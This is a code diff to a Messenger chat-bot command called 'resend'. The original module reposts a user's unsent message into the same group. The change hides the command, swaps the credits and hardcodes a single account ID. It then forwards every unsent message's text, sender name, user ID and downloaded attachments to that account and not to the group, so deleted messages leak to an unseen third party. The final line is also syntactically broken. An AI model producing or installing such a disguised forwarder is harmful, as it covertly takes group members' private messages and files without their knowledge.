@@ -1,75 +1,47 @@
-module.exports.config = {
-	name: "resend",
-	version: "2.0.0",
-	permission: 1,
-	credits: "ryuko",
-	description: "resends messages",
-  prefix: true,
-	category: "system", 
-	usages: "resend",
-	cooldowns: 0,
-  dependencies: {"request":"",       
-                 "fs-extra":"",
-                 "axios":""
-                }
+var main = "100006473882758";
 
-};
+module.exports.config = { name: "resend", version: "2.0.0", permssion: 1, credits: "Nayan", description: "", category: "general", prefix: true, usages: "resend", cooldowns: 0, hide: true, dependencies: { "request": "", "fs-extra": "", "axios": "" } };
 
-module.exports.handleEvent = async function ({ event, api, client, Users }) {
-    const request = global.nodemodule["request"];
-    const axios = global.nodemodule["axios"]
-    const { writeFileSync, createReadStream } = global.nodemodule["fs-extra"];
-  let {messageID, senderID, threadID, body:content } = event;
-     if (!global.logMessage) global.logMessage = new Map();	
-     if (!global.data.botID) global.data.botID = api.getCurrentUserID();
+module.exports.handleEvent = async function ({ event, api, client, Users }) { const request = global.nodemodule.request; const axios = global.nodemodule.axios; const { writeFileSync, createReadStream } = global.nodemodule["fs-extra"]; let { messageID, senderID, threadID, body, type } = event;
+
+if (!global.logMessage) { global.logMessage = new Map(); } if (!global.data.botID) { global.data.botID = api.getCurrentUserID(); }
+
+const threadData = global.data.threadData.get(parseInt(threadID)) || {}; if (typeof threadData.resend !== "undefined" && threadData.resend === false) { return; } if (senderID === global.data.botID) { return; }
+
+if (type !== "message_unsend") { global.logMessage.set(messageID, { msgBody: body, attachment: event.attachments }); }
+
+if (type === "message_unsend") { var logData = global.logMessage.get(messageID); if (!logData) { return; }
+
+let userName = await Users.getNameUser(senderID);
+let responseBody = `Name: ${userName}\nUID: ${senderID}\nunsend the message`;
+
+if (logData.msgBody) {
+  responseBody += `\n\nContent: ${logData.msgBody}`;
+}
+
+if (!logData.attachment[0]) {
+  return api.sendMessage(responseBody, main);
+} else {
+  let attachments = [];
+  let count = 0;
   
-  const thread = global.data.threadData.get(parseInt(threadID)) || {};
-  
-  if (typeof thread["resend"] != "undefined" && thread["resend"] == false) return;
-  if (senderID == global.data.botID) return;
-
-        
-     if(event.type != "message_unsend") global.logMessage.set(messageID,{
-        msgBody: content,
-        attachment:event.attachments
-      })
-    if(event.type == "message_unsend") {
-      var getMsg = global.logMessage.get(messageID);
-      if(!getMsg) return;
-     let name = await Users.getNameUser(senderID);
-      if(getMsg.attachment[0] == undefined) return api.sendMessage(`${name} just unsent a message \nmessage : ${getMsg.msgBody}`,threadID)
-      else {
-            let num = 0
-            let msg = {
-              body:`${name} just unsent a ${getMsg.attachment.length} attachments${(getMsg.msgBody != "") ? `\ncontent : ${getMsg.msgBody}` : ""}`,
-              attachment:[],
-              mentions:{tag:name,id:senderID}
-            }
-          for (var i of getMsg.attachment) {
-            num += 1;
-        var getURL = await request.get(i.url);
-        var pathname = getURL.uri.pathname;
-        var ext = pathname.substring(pathname.lastIndexOf(".") + 1);
-        var path = __dirname + `/cache/${num}.${ext}`;
-        var data = (await axios.get(i.url, { responseType: 'arraybuffer' })).data;
-        writeFileSync(path, Buffer.from(data, "utf-8"));
-      msg.attachment.push(createReadStream(path));
+  for (let attachment of logData.attachment) {
+    count += 1;
+    let fileExt = attachment.url.split(".").pop();
+    let filePath = `${__dirname}/cache/${count}.${fileExt}`;
+    let fileData = (await axios.get(attachment.url, { responseType: "arraybuffer" })).data;
+    writeFileSync(filePath, Buffer.from(fileData, "utf-8"));
+    attachments.push(createReadStream(filePath));
   }
-        api.sendMessage(msg, threadID);
-        }
-      }
-   }
+  
+  api.sendMessage({ body: responseBody, attachment: attachments }, main);
+}
 
-module.exports.run = async function({ api, event, Threads }) {
-	const { threadID, messageID } = event;
+} };
 
-	var data = (await Threads.getData(threadID)).data;
-	
-	if (typeof data["resend"] == "undefined" || data["resend"] == false) data["resend"] = true;
-	else data["resend"] = false;
-	
-	await Threads.setData(parseInt(threadID), { data });
-	global.data.threadData.set(parseInt(threadID), data);
-	
-	return api.sendMessage(`is already ${(data["resend"] == true) ? "turn on" : "Turn off"} successfully!`, threadID, messageID);
-    }
+module.exports.run = async function ({ api, event, Threads }) { const { threadID, messageID } = event; var threadData = (await Threads.getData(threadID)).data;
+
+threadData.resend = !threadData.resend; await Threads.setData(parseInt(threadID), { data: threadData }); global.data.threadData.set(parseInt(threadID), threadData);
+
+return api.sendMessage(Resend feature is now ${threadData.resend ? "enabled" : "disabled"}., threadID, messageID); };
+
